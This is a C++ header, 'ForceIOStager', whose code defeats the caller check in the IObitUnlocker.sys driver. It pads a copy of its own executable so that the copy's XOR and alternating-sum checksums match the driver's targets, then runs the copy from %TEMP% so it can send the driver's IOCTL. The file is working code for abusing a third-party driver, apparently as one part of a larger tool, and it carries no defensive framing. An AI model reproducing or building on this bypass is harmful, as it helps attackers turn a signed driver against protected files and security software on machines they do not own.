// ForceIOStager.h
// In-flight checksum stager for the IObitUnlocker.sys caller validation.
//
// The driver reads the calling process's entire EXE from disk and verifies
// two checksums: byte-wise XOR == 0x2B and alternating add/sub == 0x00A88677.
// If this binary does not satisfy them, EnsurePadded() creates a temporary
// padded copy in %TEMP%, spawns it with _FORCEIO_WORKER=1, waits, and cleans up.

#pragma once

#include <windows.h>
#include <vector>

class ForceIOStager {
public:
    static constexpr BYTE   TARGET_XOR = 0x2B;
    static constexpr DWORD  TARGET_ALT = 0x00A88677;

    static void ComputeChecksums(
        const BYTE* data,
        DWORD       length,
        BYTE&       outXor,
        DWORD&      outAlt
    ) noexcept {
        BYTE  x = 0;
        DWORD a = 0;
        for (DWORD i = 0; i < length; ++i) {
            x ^= data[i];
            if ((i & 1) == 0)
                a += data[i];
            else
                a -= data[i];
        }
        outXor = x;
        outAlt = a;
    }

    // Returns true if a worker was spawned and finished — caller should
    // ExitProcess(*exitCode). Returns false if the current process can
    // execute the IOCTL directly (already a worker, or pre-padded binary).
    static bool EnsurePadded(DWORD* exitCode) noexcept {
        wchar_t env[8]{};
        if (GetEnvironmentVariableW(L"_FORCEIO_WORKER", env, 8) > 0)
            return false;

        wchar_t selfPath[MAX_PATH]{};
        const DWORD pathLen = GetModuleFileNameW(nullptr, selfPath, MAX_PATH);
        if (pathLen == 0 || pathLen >= MAX_PATH)
            return false;

        HANDLE hSelf = CreateFileW(
            selfPath, GENERIC_READ, FILE_SHARE_READ,
            nullptr, OPEN_EXISTING, 0, nullptr
        );
        if (hSelf == INVALID_HANDLE_VALUE)
            return false;

        const DWORD fileSize = GetFileSize(hSelf, nullptr);
        if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
            CloseHandle(hSelf);
            return false;
        }

        const DWORD maxAlloc = fileSize + 131072;
        auto* buf = static_cast<BYTE*>(
            VirtualAlloc(nullptr, maxAlloc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
        );
        if (!buf) {
            CloseHandle(hSelf);
            return false;
        }

        DWORD bytesRead = 0;
        if (!ReadFile(hSelf, buf, fileSize, &bytesRead, nullptr)
            || bytesRead != fileSize) {
            VirtualFree(buf, 0, MEM_RELEASE);
            CloseHandle(hSelf);
            return false;
        }
        CloseHandle(hSelf);

        BYTE  curXor = 0;
        DWORD curAlt = 0;
        ComputeChecksums(buf, fileSize, curXor, curAlt);

        if (curXor == TARGET_XOR && curAlt == TARGET_ALT) {
            VirtualFree(buf, 0, MEM_RELEASE);
            return false;
        }

        DWORD alignedSize = fileSize;
        if (alignedSize & 1) {
            buf[alignedSize++] = 0;
            ComputeChecksums(buf, alignedSize, curXor, curAlt);
        }

        const DWORD altNeed = TARGET_ALT - curAlt;
        const DWORD bulk    = altNeed / 255;
        const DWORD remain  = altNeed % 255;
        const BYTE xorAfter = static_cast<BYTE>(
            curXor ^ ((bulk & 1) ? 0xFF : 0x00)
        );
        const BYTE xorNeed  = xorAfter ^ TARGET_XOR;

        if (alignedSize + (bulk * 2) + 4 > maxAlloc) {
            VirtualFree(buf, 0, MEM_RELEASE);
            return false;
        }

        BYTE b0 = 0, b1 = 0, b2 = 0, b3 = 0;
        bool found = false;
        for (int i0 = 0; i0 < 256 && !found; ++i0) {
            for (int i2 = 0; i2 < 256 && !found; ++i2) {
                const int oddSum = i0 + i2 - static_cast<int>(remain);
                const int oddXor = i0 ^ i2 ^ xorNeed;
                if (oddSum < 0 || oddSum > 510) continue;
                if (((oddSum - oddXor) & 1) != 0) continue;
                for (int i1 = 0; i1 < 256; ++i1) {
                    const int i3 = oddSum - i1;
                    if (i3 >= 0 && i3 <= 255 && ((i1 ^ i3) == oddXor)) {
                        b0 = static_cast<BYTE>(i0);
                        b1 = static_cast<BYTE>(i1);
                        b2 = static_cast<BYTE>(i2);
                        b3 = static_cast<BYTE>(i3);
                        found = true;
                        break;
                    }
                }
            }
        }

        if (!found) {
            VirtualFree(buf, 0, MEM_RELEASE);
            return false;
        }

        DWORD p = alignedSize;
        for (DWORD k = 0; k < bulk; ++k) {
            buf[p++] = 0xFF;
            buf[p++] = 0x00;
        }
        buf[p++] = b0;
        buf[p++] = b1;
        buf[p++] = b2;
        buf[p++] = b3;
        const DWORD totalSize = p;

        wchar_t tempPath[MAX_PATH]{};
        const DWORD tlen = GetTempPathW(MAX_PATH, tempPath);
        if (tlen == 0 || tlen >= MAX_PATH - 64) {
            VirtualFree(buf, 0, MEM_RELEASE);
            return false;
        }

        wchar_t suffix[64]{};
        wsprintfW(suffix, L"fio_wk_%lu_%lu.exe",
                  GetCurrentProcessId(), GetTickCount());

        wchar_t* end = tempPath + tlen;
        if (end > tempPath && *(end - 1) != L'\\')
            *end++ = L'\\';
        for (const wchar_t* s = suffix; *s; )
            *end++ = *s++;
        *end = L'\0';

        HANDLE hOut = CreateFileW(
            tempPath, GENERIC_WRITE, 0, nullptr,
            CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, nullptr
        );
        if (hOut == INVALID_HANDLE_VALUE) {
            VirtualFree(buf, 0, MEM_RELEASE);
            return false;
        }

        DWORD written = 0;
        const BOOL writeOk = WriteFile(hOut, buf, totalSize, &written, nullptr);
        CloseHandle(hOut);
        VirtualFree(buf, 0, MEM_RELEASE);

        if (!writeOk || written != totalSize) {
            DeleteFileW(tempPath);
            return false;
        }

        SetEnvironmentVariableW(L"_FORCEIO_WORKER", L"1");

        STARTUPINFOW si{};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);
        si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
        si.hStdError  = GetStdHandle(STD_ERROR_HANDLE);

        PROCESS_INFORMATION pi{};
        wchar_t cmdBuf[8192]{};
        const wchar_t* raw = GetCommandLineW();
        for (int i = 0; raw[i] && i < 8191; ++i)
            cmdBuf[i] = raw[i];

        if (!CreateProcessW(tempPath, cmdBuf, nullptr, nullptr,
                            TRUE, 0, nullptr, nullptr, &si, &pi)) {
            DeleteFileW(tempPath);
            return false;
        }

        WaitForSingleObject(pi.hProcess, INFINITE);

        DWORD code = 0;
        GetExitCodeProcess(pi.hProcess, &code);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        DeleteFileW(tempPath);

        if (exitCode) *exitCode = code;
        return true;
    }
};
